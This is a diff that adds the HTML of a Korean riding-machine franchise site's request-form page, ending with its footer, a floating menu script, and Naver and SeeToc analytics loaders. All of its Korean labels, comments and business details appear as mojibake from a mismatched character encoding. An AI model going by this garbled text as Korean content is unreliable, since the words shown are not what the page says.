+																														<option value="¼³Ä¡¿äÃ»">&nbsp;¼³Ä¡¿äÃ»</option>
+																													</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>±âÅ¸</b></p>
+														</td>
+														<td bgcolor="white">
+																														<input type="checkbox" name="text3" value="1" class="input1">&nbsp;È¨ÆäÀÌÁöº¸À¯&nbsp;&nbsp;
+																														<input type="checkbox" name="text4" value="1" class="input1">&nbsp;µµ¸ÞÀÎº¸À¯&nbsp;&nbsp;
+																														<input type="checkbox" name="text5" value="1" class="input1">&nbsp;¸ðµ¨¸µ»çÀÌÆ®&nbsp;&nbsp;
+																													</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>È¨ÆäÀÌÁöÁÖ¼Ò</b></p>
+														</td>
+														<td bgcolor="white"><input type="text" size="30" name="text7" size="35" class="input">
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>°£·«¼Ò°³±Û</b></p>
+														</td>
+														<td bgcolor="white">
+															<textarea rows="5" cols="80" name="text8" class="input"></textarea>
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																										<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>³»  ¿ë</b></p>
+														</td>
+														<td bgcolor="white" style="padding-left:5px;">
+															<textarea name="content" style="display:none" class="input"></textarea>
+															<!-- ¿¡µðÅÍ¸¦ È­¸é¿¡ Ãâ·ÂÇÕ´Ï´Ù. -->
+															<script type="text/javascript" language="javascript">
+																var myeditor = new cheditor("myeditor");
+																myeditor.config.editorHeight = '200px';             // ¿¡µðÅÍ ¼¼·ÎÆøÀÔ´Ï´Ù.
+																myeditor.config.editorWidth = '100%';                // ¿¡µðÅÍ °¡·ÎÆøÀÔ´Ï´Ù.
+																myeditor.config.editorPath = '../cheditor/';                 // ¿¡µðÅÍ ¼³Ä¡ °æ·ÎÀÔ´Ï´Ù.
+																
+																myeditor.inputForm = 'content';                     // ÀÔ·Â textareaÀÇ ID ÀÌ¸§ÀÔ´Ï´Ù.
+																
+																myeditor.run();                                     // ¿¡µðÅÍ¸¦ ½ÇÇàÇÕ´Ï´Ù.
+															</script>
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																										<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>³¯ Â¥</b></p>
+														</td>
+														<td bgcolor="white" style="padding-left:5px;">
+															<input name="datainput" type="text" size="30" onclick="popFrame.fPopCalendar(datainput,datainput,popCal);return false" readonly>
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>ÆÄÀÏµî·Ï</b></p>
+														</td>
+														<td bgcolor="white" style="padding-left:5px;">
+															<input type="file" name="fileinput" size="45">
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																									</table>
+											</td>
+										</tr>
+										<tr>
+											<td align='center'>
+												<input type="hidden" name="cnt" value="8" class="input">
+												<br><a href="javascript:writeSendit();"><img src="images/bt_reg_save.gif" border="0" align="absmiddle"></a> <a href=javascript:history.go(-1);><img src="images/bt_cancel.gif" border="0" align="absmiddle"></a>
+											</td>
+										</tr>
+										</form>
+										<tr>
+											<td>
+																							</td>
+										</tr>
+									</table>
+									<!-- Ãâ·Â³»¿ë -->
+							<!-- Ãâ·Â³»¿ë -->
+							</td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+			</table>
+			<!-----------------ÆäÀÌÁö³»¿ë.Ä«Å×°í¸®Ãâ·Â----------->
+          </td>
+        </tr>
+        </table>
+      </td>
+    </tr>
+    </table>
+  </td>
+</tr>
+</table>
+<!------------¸ÞÀÎÅ×ÀÌºíÃâ·Â³¡----------->
+				</td>
+				<td width="74" style="padding-left:10px;">
+					<!-----------------¿ìÃø·¹ÀÌ¾î½ÃÀÛ----------->
+					<SCRIPT language=javascript>
+	<!--
+	var isDOM = (document.getElementById ? true : false);
+	var isIE4 = ((document.all && !isDOM) ? true : false);
+	var isNS4 = (document.layers ? true : false);
+	var isNS = navigator.appName == "Netscape";
+	
+	function getRef(id) {
+		if (isDOM) return document.getElementById(id);
+		if (isIE4) return document.all[id];
+		if (isNS4) return document.layers[id];
+	}
+	
+	function getSty(id) {
+		x = getRef(id);
+		return (isNS4 ? getRef(id) : getRef(id).style);
+	}
+	
+	function moveRightEdge() {
+		var yMenuFrom, yMenuTo, yOffset, timeoutNextCheck;
+		
+		if (isNS4) {
+			yMenuFrom   = divMenu2.top;
+			yMenuTo     = windows.pageYOffset + 200;   // À§ÂÊ À§Ä¡
+		} else if (isDOM) {
+			yMenuFrom   = parseInt (divMenu2.style.top, 10);
+			yMenuTo     = (isNS ? window.pageYOffset : document.body.scrollTop) + 200; // À§ÂÊ À§Ä¡
+		}
+		timeoutNextCheck = 500;
+		
+		if (yMenuFrom != yMenuTo) {
+			yOffset = Math.ceil(Math.abs(yMenuTo - yMenuFrom) / 20);
+			if (yMenuTo < yMenuFrom)
+			yOffset = -yOffset;
+			if (isNS4)
+			divMenu2.top += yOffset;
+			else if (isDOM)
+			divMenu2.style.top = parseInt (divMenu2.style.top, 10) + yOffset;
+			timeoutNextCheck = 10;
+		}
+		setTimeout ("moveRightEdge()", timeoutNextCheck);
+	}
+	//-->
+</SCRIPT>
+
+<SCRIPT>
+function setPng24(obj) { 
+    obj.width=obj.height=1; 
+    obj.className=obj.className.replace(/\bpng24\b/i,''); 
+    obj.style.filter = 
+    "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+ obj.src +"',sizingMethod='image');" 
+    obj.src='';  
+    return ''; 
+} 
+</script>
+
+<div id="divMenu2" style="position:absolute; top:140; width:74; z-index:1; visibility:">
+<table cellpadding="0" cellspacing="0" width="74">
+	<tr>
+		<td>
+			<p><img src="images/quick_title.png" width="74" height="55" border="0" class="png24"></p>
+		</td>
+	</tr>
+	<tr>
+		<td height="100" align="center" valign="top" background="images/quicklink_bg1.gif" class="png24">
+			<table width="60" cellpadding="0" cellspacing="0" border="0">
+				<tr>
+					<td align="center" class="sens_body2">
+						<!---------¿ìÃø¹Ù·Î°¡±â ¹è³Ê ·¹ÀÌ¾î----------->
+												
+						<table cellpadding="0" cellspacing="0" border="0">
+							<tr>
+																<td align="center">
+																		<p><img src="../data/designImages/LAYER_1368669169" height="26" width="60" border="0"></p>
+																	</td>
+															</tr>
+							<tr>
+																<td align="center">
+																		<p><img src="../data/designImages/LAYER_1368669315" height="26" width="60" border="0"></p>
+																	</td>
+															</tr>
+							<tr>
+																<td align="center">
+																		<p><a href="http://smrobotics.net/skin31/bbs_list.php?unsingcode1=1185858166&unsingcode2=1226849660&code=flashphoto" target="_blank"><img src="../data/designImages/LAYER_1423988807" height="26" width="60" border="0"></a></p>
+																	</td>
+															</tr>
+							<tr>
+																<td align="center">
+																		<p><a href="http://smrobotics.net/skin31/request.php?unsingcode1=1185858166&unsingcode2=1347226712&code=bd91f5dcb3e4898b9ca6e031c7fb2e19" target="_blank"><img src="../data/designImages/LAYER_1423988928" height="26" width="60" border="0"></a></p>
+																	</td>
+															</tr>
+							<tr>
+															</table>
+							
+														
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<p><a href='#'><img src="images/quick_title2.png" width="74" height="40" border="0" class="png24"></a></p>
+			</td>
+		</tr>
+	</table>
+	</div>
+	<SCRIPT language=javascript>
+		<!--
+		if (isNS4) {
+			var divMenu2 = document["divMenu2"];
+			divMenu2.top = top.pageYOffset + 0;
+			divMenu2.visibility = "visible";
+			moveRightEdge();
+		} else if (isDOM) {
+			var divMenu2 = getRef('divMenu2');
+			divMenu2.style.top = (isNS ? window.pageYOffset : document.body.scrollTop) + 0;
+			divMenu2.style.visibility = "visible";
+			moveRightEdge();
+		}
+		//-->
+	</SCRIPT>
+					</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%">
+    <tr>
+        <td height="194" background="images/page_footer_bg2.gif">
+            <table cellpadding="0" cellspacing="0" width="950" height="194">
+                <tr>
+                    <td background="images/page_footer_bg1.gif"></td>
+                </tr>
+            </table>
+		</td>
+    </tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%">
+<tr>
+  <td height="110" valign="top" background="images/footer_bg.gif">
+    <table cellpadding="0" cellspacing="0" width="950">
+    <tr>
+      <td height="10"></td>
+    </tr>
+    <tr>
+      <td height="13" align="right" style="padding-right:20px;">
+		<table cellpadding="1" cellspacing="0">
+			<tr>
+								<td>
+					<p><a href="javascript:na_open_window('memberinfoadmin', 'memberinfoadmin.php', 100, 100, 720, 600, 0, 0, 0, 1, 0)"><img src="images/footer_privacy.gif" width="95" height="15" border="0"></a></p>
+				</td>
+								<td>
+					<p><a href="javascript:na_open_window('win', 'nomail.php', 300, 300, 375, 230, 0, 0, 0, 0, 0)"><img src="images/footer_nomail.gif" width="95" height="15" border="0"></a></p>
+				</td>
+				<td>
+					<p><a href="index.php"><img src="images/footer_home.gif" width="48" height="15" border="0"></a></p>
+				</td>
+				<td>
+					<p><a href="javascript:history.back(-1)"><img src="images/footer_back.gif" width="121" height="15" border="0"></a></p>
+				</td>
+				<td>
+					<p><a href="#"><img src="images/footer_top.gif" width="50" height="15" border="0"></a></p>
+				</td>
+			</tr>
+		</table>
+      </td>
+    </tr>
+    <tr>
+      <td align="center" class='f_copy' height="7" background="images/footer_line.gif">
+      </td>
+    </tr>		
+    <tr>
+      <td height="5"></td>
+    </tr>
+    <tr>
+      <td align="center">
+        <table cellpadding="0" cellspacing="0" width="889">
+        <tr>
+          <td width="200" align="center">
+			<!---------ÇÏ´Ü·Î°íÃâ·Â---------->
+			<table cellpadding="0" cellspacing="0">
+				<tr>
+					<td><table cellpadding="0" cellspacing="0" border="0">
+	<tr>
+		<td height="65" align="center" class='sens_body'>
+				<a href='index.php'><img src='../data/designImages/TITLE_logo2_1441917421.png' width='250' height='67' border='0' align='absmiddle'></a>		</td>
+	</tr>
+</table></td>
+				</tr>
+			</table>
+			<!---------ÇÏ´Ü·Î°íÃâ·Â---------->
+          </td>
+          <td width="15" align="center"></td>
+          <td width="485" align="center">
+            <table cellpadding="0" cellspacing="0" width="510">
+            <tr>
+              <td align="center" class='f_copy' height="20">Áß°í ½Â¸¶±â »ç¾÷º»ºÎ :  Ãæ³² Ãµ¾È½Ã ¼­ºÏ±¸ µÎÁ¤µ¿ 1423¹øÁö 4Ãþ (ÁÖ)½ºÅ¸È¦½º / Åë½ÅÆÇ¸Å Á¦2011-Ãæ³²-132È£<br> &nbsp;&nbsp;<b>&middot;</b> ´ëÇ¥ÀÚ : Á¶´Üºñ &nbsp;&nbsp;<b>&middot;</b> »ç¾÷ÀÚ¹øÈ£ : <span class="f_copy3">312-10-24689 / 215-87-92175</span></td>
+            </tr>
+            <tr>
+              <td align="center" class='f_copy'><b>&middot;</b> ´ëÇ¥¾È³»ÀüÈ­ : <span class="f_copy3">070-7777-5627 /  010-6742-2334</span> &nbsp;&nbsp;<b>&middot;</b> FAX : <span class="f_copy3">0505-918-5555</span> &nbsp;&nbsp;<b>&middot;</b> <span class="f_copy3">E-mail : </span><a href="javascript:openSendMail()"><span class="f_copy3" OnMouseOver="this.style.color='FF6000';" OnMouseOut="this.style.color=''; this.style.fontSize=''">master@smrobotics.com</span></a></td>
+            </tr>
+            <tr>
+              <td align="center" class='f_copy' height="7" background="images/footer_line.gif">
+              </td>
+            </tr>
+            <tr>
+              <td align="center" class='f_copy3'>Copyright ¨Ï 2022 . All rights reserved.</td>
+            </tr>
+            </table>
+          </td>
+          <td width="15" align="center"></td>
+          <td width="174" align="center">
+			<!-----------ÆÐ¹Ð¸®»çÀÌÆ®Ãâ·Â------------>
+			<script language="JavaScript">
+<!--
+// Æû Àü¼Û
+function change_url(value) {
+	if(value!="null"){
+		window.open("http://"+value, "","");
+	}
+}
+//-->
+</script>
+<table cellpadding="0" cellspacing="0" width="175">
+<tr>
+  <td>
+	<p><img src="images/footer_link_title.gif" width="165" height="20" border="0"></p>
+  </td>
+</tr>
+<tr>
+  <td height="25" align="center">
+		<select size="1" onchange="change_url(this.value)">
+		<option value="null">ÆÐ¹Ð¸® »çÀÌÆ®</option>
+				<option value="smrobotics.com">½ºÅ©¸°½Â¸¶ °¡¸ÍÁ¡ »ç¾÷º»ºÎ</option> 
+				<option value="smrobotics.net">½ºÅ©¸°½Â¸¶ ¼¥ÀÎ¼¥ »ç¾÷º»ºÎ</option> 
+				<option value="blog.naver.com/wizflo">½ºÅ¸È¦½º °ø½Ä ºí·¯±×</option> 
+				<option value="cafe.naver.com/tophorse0">½ºÅ¸È¦½º °ø½Ä Ä«Æä</option> 
+				</select>
+  </td>
+</tr>
+</table>			<!-----------ÆÐ¹Ð¸®»çÀÌÆ®Ãâ·Â------------>
+          </td>
+        </tr>
+        </table>
+      </td>
+    </tr>
+    </table>
+  </td>
+</tr>
+</table>
+
+<script type="text/javascript" src="http://wcs.naver.net/wcslog.js"></script> 
+<script type="text/javascript"> 
+
+if(document.URL.indexOf("sub_page.php?page_idx=9") >-1){
+var _nasa={};
+_nasa["cnv"] = wcs.cnv("5","1"); // ÀüÈ¯À¯Çü, ÀüÈ¯°¡Ä¡ ¼³Á¤ÇØ¾ßÇÔ. ¼³Ä¡¸Å´º¾ó Âü°í
+}
+if (!wcs_add) var wcs_add={};
+wcs_add["wa"] = "s_48e33497b8c9";
+if (!_nasa) var _nasa={};
+wcs.inflow();
+wcs_do(_nasa);
+</script>
+
+<!-- SeeToc °øÅë ½ºÅ©¸³Æ® -->
+<script type="text/javascript">
+var obj_date = new Date();
+var strDate = "";
+strDate += obj_date.getFullYear();
+strDate += obj_date.getMonth();
+strDate += obj_date.getDay()
+var SEETOC_SCRIPT_URL = 'www.seetoc.com/static/visitor/seetoc.js?' + strDate;
+var SEETOC_SERVICE_ID = '35664exSj5I';
+function seetocReady(config, logger) {
+config.setServiceId(SEETOC_SERVICE_ID);
+logger.sendPageview();
+}
+(function(){
+var cts = document.createElement('script');
+cts.type = 'text/javascript';
+cts.src = document.location.protocol + '//' + SEETOC_SCRIPT_URL;
+cts.charset = 'UTF-8';
+cts.async = true;
+var fss = document.getElementsByTagName('script')[0];
+fss.parentNode.insertBefore(cts, fss);
+})();
+</script>
+<!--// SeeToc °øÅë ½ºÅ©¸³Æ® -->
+
+</body>
+
+</html>
